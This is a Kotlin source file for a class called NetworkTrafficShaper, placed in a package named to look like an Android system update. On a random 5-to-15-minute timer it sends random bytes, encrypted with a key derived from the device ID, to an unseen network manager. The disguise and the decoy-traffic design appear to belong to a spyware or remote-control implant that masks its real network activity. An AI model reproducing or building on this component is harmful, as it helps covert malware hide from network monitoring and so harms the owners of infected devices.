package com.android.system.update.core

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import android.util.Base64

class NetworkTrafficShaper(private val context: Context) {

    private val handler = Handler(Looper.getMainLooper())
    private val random = SecureRandom()
    private val networkManager = NetworkConnectionManager(context)
    private val deviceKey: ByteArray

    init {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
    }

    fun startShaping() {
        handler.post(object : Runnable {
            override fun run() {
                generateDummyTraffic()
                val delay = 300000 + random.nextInt(600000)
                handler.postDelayed(this, delay.toLong())
            }
        })
    }

    private fun generateDummyTraffic() {
        val dummyData = ByteArray(1024).also { random.nextBytes(it) }
        val encrypted = encrypt(dummyData)
        networkManager.sync(Base64.encodeToString(encrypted, Base64.NO_WRAP))
    }

    private fun encrypt(data: ByteArray): ByteArray {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        val encrypted = cipher.doFinal(data)
        return iv + encrypted
    }

    fun stopShaping() {
        handler.removeCallbacksAndMessages(null)
    }
}